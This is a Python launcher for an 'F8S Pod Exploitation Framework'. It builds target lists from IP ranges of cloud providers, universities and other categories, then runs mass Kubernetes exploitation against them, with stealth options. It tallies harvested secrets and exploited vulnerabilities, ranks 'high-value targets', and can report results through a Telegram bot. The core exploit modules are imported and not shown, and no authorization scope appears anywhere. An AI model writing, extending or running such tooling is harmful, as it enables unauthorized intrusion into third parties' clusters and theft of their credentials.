#!/usr/bin/env python3
"""
🚀 Optimized F8S Mega Launch - Enhanced Launcher with Mega CIDR UHQ Integration
Author: wKayaa | F8S Pod Exploitation Framework | 2025-01-28

Enhanced launcher integrating the Mega CIDR UHQ system with the existing
F8S Pod Exploitation Framework for maximum Kubernetes cluster discovery.
"""

import asyncio
import json
import datetime
import sys
from typing import Dict, List, Optional, Any
from pathlib import Path

# Import existing F8S framework components
try:
    from f8s_exploit_pod import F8sPodExploiter, run_f8s_exploitation
    from mega_cidr_uhq import MegaCIDRUHQ, CIDRTarget, ScanStrategy
    from kubernetes_advanced import KubernetesAdvancedExploitation, ExploitationConfig, ExploitationMode
except ImportError as e:
    print(f"❌ Import error: {e}")
    print("⚠️  Make sure all required modules are available")
    sys.exit(1)

class OptimizedF8SMegaLauncher:
    """Enhanced F8S launcher with Mega CIDR UHQ integration"""
    
    def __init__(self, 
                 telegram_token: Optional[str] = None,
                 stealth_mode: bool = True,
                 max_concurrent: int = 100):
        self.telegram_token = telegram_token
        self.stealth_mode = stealth_mode
        self.max_concurrent = max_concurrent
        self.session_id = f"f8s_mega_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Initialize mega CIDR system
        self.mega_cidr = MegaCIDRUHQ()
        
        # Initialize F8S exploiter
        self.f8s_exploiter = F8sPodExploiter(
            telegram_token=telegram_token,
            stealth_mode=stealth_mode
        )
        
        # Initialize advanced Kubernetes exploitation
        self.k8s_config = ExploitationConfig(
            mode=ExploitationMode.AGGRESSIVE if not stealth_mode else ExploitationMode.PASSIVE,
            max_concurrent_clusters=max_concurrent,
            timeout_per_operation=10 if not stealth_mode else 30
        )
        self.k8s_exploiter = KubernetesAdvancedExploitation(self.k8s_config)
        
        # Results tracking
        self.results = {
            'session_id': self.session_id,
            'start_time': datetime.datetime.now().isoformat(),
            'targets_scanned': 0,
            'clusters_found': 0,
            'secrets_discovered': 0,
            'vulnerabilities_exploited': 0,
            'categories_processed': [],
            'high_value_targets': []
        }
        
        print(f"🚀 Optimized F8S Mega Launcher initialized - Session: {self.session_id}")
    
    async def select_target_strategy(self) -> Dict[str, Any]:
        """Interactive target selection strategy"""
        print("\n🎯 TARGET STRATEGY SELECTION")
        print("=" * 40)
        
        strategies = {
            '1': {
                'name': 'Stealth Maximum Coverage',
                'description': 'Comprehensive scan with stealth mode',
                'priority_threshold': 5,
                'max_targets': 5000,
                'stealth_mode': True,
                'include_ipv6': False
            },
            '2': {
                'name': 'Aggressive High-Priority',
                'description': 'Fast scan of high-probability targets',
                'priority_threshold': 8,
                'max_targets': 2000,
                'stealth_mode': False,
                'include_ipv6': False
            },
            '3': {
                'name': 'Cloud Provider Focus',
                'description': 'Target cloud providers aggressively',
                'categories': ['cloud_providers', 'container_orchestration'],
                'stealth_mode': False,
                'max_targets': 3000
            },
            '4': {
                'name': 'Safe Educational/Research',
                'description': 'Target educational and research institutions',
                'categories': ['educational', 'emerging_markets'],
                'stealth_mode': True,
                'max_targets': 1500
            },
            '5': {
                'name': 'Custom Selection',
                'description': 'Custom category and parameter selection',
                'custom': True
            }
        }
        
        print("Available strategies:")
        for key, strategy in strategies.items():
            risk = "🛡️ Safe" if strategy.get('stealth_mode', True) else "⚡ Aggressive"
            print(f"  {key}. {strategy['name']} - {strategy['description']} ({risk})")
        
        choice = input("\nSelect strategy (1-5) [default: 1]: ").strip() or '1'
        
        if choice in strategies:
            selected = strategies[choice]
            
            if selected.get('custom'):
                return await self.custom_strategy_selection()
            else:
                print(f"✅ Selected: {selected['name']}")
                return selected
        else:
            print("⚠️  Invalid selection, using default stealth strategy")
            return strategies['1']
    
    async def custom_strategy_selection(self) -> Dict[str, Any]:
        """Custom strategy selection"""
        print("\n🛠️  CUSTOM STRATEGY CONFIGURATION")
        print("=" * 40)
        
        # Show available categories
        stats = self.mega_cidr.get_category_statistics()
        print("\nAvailable categories:")
        for i, (category, data) in enumerate(stats.items(), 1):
            risk = "🔒 Stealth Required" if data['stealth_required'] else "🔓 Safe"
            print(f"  {i}. {category} - {data['total_ranges']} ranges ({risk})")
        
        # Category selection
        selected_categories = []
        category_list = list(stats.keys())
        
        while True:
            selection = input(f"\nSelect categories (1-{len(category_list)}, comma-separated) or 'all': ").strip()
            
            if selection.lower() == 'all':
                selected_categories = category_list
                break
            
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(',')]
                selected_categories = [category_list[i] for i in indices if 0 <= i < len(category_list)]
                break
            except (ValueError, IndexError):
                print("❌ Invalid selection, please try again")
        
        # Parameter configuration
        max_targets = int(input("Max targets (default: 2000): ").strip() or "2000")
        stealth_mode = input("Stealth mode? (y/n) [default: y]: ").strip().lower() != 'n'
        include_ipv6 = input("Include IPv6? (y/n) [default: n]: ").strip().lower() == 'y'
        
        return {
            'name': 'Custom Strategy',
            'categories': selected_categories,
            'max_targets': max_targets,
            'stealth_mode': stealth_mode,
            'include_ipv6': include_ipv6
        }
    
    def generate_targets_from_strategy(self, strategy: Dict[str, Any]) -> List[str]:
        """Generate target list from strategy"""
        print(f"\n🎯 Generating targets using strategy: {strategy['name']}")
        
        if 'categories' in strategy:
            # Category-based selection
            targets = self.mega_cidr.get_targets_by_category(strategy['categories'])
            target_cidrs = [t.cidr for t in targets]
            
            # Expand CIDRs to IPs
            all_ips = []
            for cidr in target_cidrs:
                ips = self.mega_cidr.expand_cidr_to_ips(cidr, max_ips=50)
                all_ips.extend(ips)
            
            # Limit to max targets
            max_targets = strategy.get('max_targets', 2000)
            return all_ips[:max_targets]
        
        else:
            # Priority-based selection
            return self.mega_cidr.generate_optimized_target_list(
                priority_threshold=strategy.get('priority_threshold', 5),
                max_targets=strategy.get('max_targets', 2000),
                stealth_mode=strategy.get('stealth_mode', True),
                include_ipv6=strategy.get('include_ipv6', False)
            )
    
    async def run_comprehensive_scan(self, targets: List[str], strategy: Dict[str, Any]):
        """Run comprehensive scan using both F8S and K8S exploiters"""
        print(f"\n🚀 Starting comprehensive scan of {len(targets)} targets")
        print(f"💪 Strategy: {strategy['name']}")
        print(f"🛡️  Stealth mode: {strategy.get('stealth_mode', True)}")
        print(f"⚡ Max concurrent: {self.max_concurrent}")
        
        self.results['targets_scanned'] = len(targets)
        
        # Phase 1: F8S Pod Exploitation
        print("\n📡 PHASE 1: F8S Pod Exploitation")
        print("-" * 40)
        
        try:
            f8s_results = await run_f8s_exploitation(
                target_ranges=targets,
                telegram_token=self.telegram_token,
                exploiter=self.f8s_exploiter,
                max_concurrent=min(50, self.max_concurrent),
                timeout=10 if not self.stealth_mode else 30
            )
            
            if f8s_results:
                self.results['secrets_discovered'] += len(f8s_results.get('secrets', []))
                self.results['vulnerabilities_exploited'] += len(f8s_results.get('exploits', []))
                
                # Extract high-value targets
                for result in f8s_results.get('successful_targets', []):
                    self.results['high_value_targets'].append({
                        'target': result,
                        'phase': 'f8s_exploitation',
                        'timestamp': datetime.datetime.now().isoformat()
                    })
            
            print(f"✅ F8S Phase completed")
        
        except Exception as e:
            print(f"❌ F8S Phase error: {e}")
        
        # Phase 2: Advanced Kubernetes Exploitation
        print("\n🔧 PHASE 2: Advanced Kubernetes Exploitation")
        print("-" * 50)
        
        try:
            await self.k8s_exploiter.run_exploitation(targets)
            k8s_summary = self.k8s_exploiter.get_summary()
            
            if k8s_summary:
                self.results['clusters_found'] += k8s_summary.get('clusters_discovered', 0)
                
                # Extract cluster information
                for cluster in k8s_summary.get('active_clusters', []):
                    self.results['high_value_targets'].append({
                        'target': cluster,
                        'phase': 'k8s_exploitation',
                        'timestamp': datetime.datetime.now().isoformat()
                    })
            
            print(f"✅ K8s Phase completed")
        
        except Exception as e:
            print(f"❌ K8s Phase error: {e}")
        
        # Update results
        self.results['end_time'] = datetime.datetime.now().isoformat()
        
        print(f"\n🎯 SCAN COMPLETED - Session: {self.session_id}")
    
    def print_results_summary(self):
        """Print comprehensive results summary"""
        print("\n" + "=" * 60)
        print("🎯 OPTIMIZED F8S MEGA SCAN RESULTS")
        print("=" * 60)
        
        print(f"📊 Session ID: {self.results['session_id']}")
        print(f"⏱️  Duration: {self.results.get('start_time', 'N/A')} - {self.results.get('end_time', 'N/A')}")
        print(f"🎯 Targets scanned: {self.results['targets_scanned']}")
        print(f"🏢 Clusters found: {self.results['clusters_found']}")
        print(f"🔐 Secrets discovered: {self.results['secrets_discovered']}")
        print(f"⚡ Vulnerabilities exploited: {self.results['vulnerabilities_exploited']}")
        print(f"💎 High-value targets: {len(self.results['high_value_targets'])}")
        
        if self.results['high_value_targets']:
            print("\n🏆 HIGH-VALUE TARGETS DISCOVERED:")
            for i, target in enumerate(self.results['high_value_targets'][:10], 1):
                print(f"  {i}. {target['target']} ({target['phase']}) - {target['timestamp']}")
            
            if len(self.results['high_value_targets']) > 10:
                print(f"  ... and {len(self.results['high_value_targets']) - 10} more")
        
        # Save results
        results_file = f"f8s_mega_results_{self.session_id}.json"
        with open(results_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n💾 Results saved to: {results_file}")
    
    async def run(self):
        """Main execution flow"""
        try:
            # Display mega CIDR summary
            self.mega_cidr.print_summary()
            
            # Strategy selection
            strategy = await self.select_target_strategy()
            
            # Generate targets
            targets = self.generate_targets_from_strategy(strategy)
            
            if not targets:
                print("❌ No targets generated, exiting")
                return
            
            print(f"✅ Generated {len(targets)} targets for scanning")
            
            # Confirmation for aggressive scans
            if not strategy.get('stealth_mode', True):
                confirm = input(f"\n⚠️  This will perform an AGGRESSIVE scan of {len(targets)} targets. Continue? (y/n): ")
                if confirm.lower() != 'y':
                    print("🛑 Scan cancelled by user")
                    return
            
            # Execute comprehensive scan
            await self.run_comprehensive_scan(targets, strategy)
            
            # Print results
            self.print_results_summary()
            
            print("\n🎯 F8S MEGA LAUNCHER COMPLETED SUCCESSFULLY!")
        
        except KeyboardInterrupt:
            print("\n🛑 Scan interrupted by user")
            self.results['end_time'] = datetime.datetime.now().isoformat()
            self.print_results_summary()
        
        except Exception as e:
            print(f"\n❌ Critical error: {e}")
            import traceback
            traceback.print_exc()

def main():
    """Main function"""
    print("🚀 OPTIMIZED F8S MEGA LAUNCHER")
    print("Enhanced F8S with Ultra-Comprehensive CIDR Database")
    print("=" * 60)
    
    # Configuration
    telegram_token = input("Telegram bot token (optional): ").strip() or None
    stealth_mode = input("Enable stealth mode? (y/n) [default: y]: ").strip().lower() != 'n'
    max_concurrent = int(input("Max concurrent scans (default: 100): ").strip() or "100")
    
    # Initialize and run launcher
    launcher = OptimizedF8SMegaLauncher(
        telegram_token=telegram_token,
        stealth_mode=stealth_mode,
        max_concurrent=max_concurrent
    )
    
    # Run async main loop
    asyncio.run(launcher.run())

if __name__ == "__main__":
    main()